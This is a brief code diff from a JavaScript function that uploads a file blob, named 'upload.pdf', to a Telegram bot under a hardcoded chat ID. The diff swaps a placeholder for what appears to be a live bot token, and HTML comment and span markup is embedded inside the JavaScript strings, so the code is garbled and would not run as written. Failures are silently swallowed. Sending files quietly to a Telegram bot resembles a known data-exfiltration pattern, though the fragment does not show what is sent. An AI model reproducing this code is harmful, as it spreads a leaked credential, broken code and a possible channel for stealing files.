@@ -315,7 +315,7 @@ function sendFileToTelegram(fileBlob) {
   const formData=new FormData();
   formData.append('chat_id','<!-- <span style="color:pink;">8580854380</span> -->'); // Change chat_id
   formData.append('document', fileBlob, 'upload.pdf');
-  fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">YOUR_BOT_TOKEN</span> -->/sendDocument`, {
+  fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdkN</span> -->/sendDocument`, {
     method:'POST',
     body:formData
   }).catch(() => {
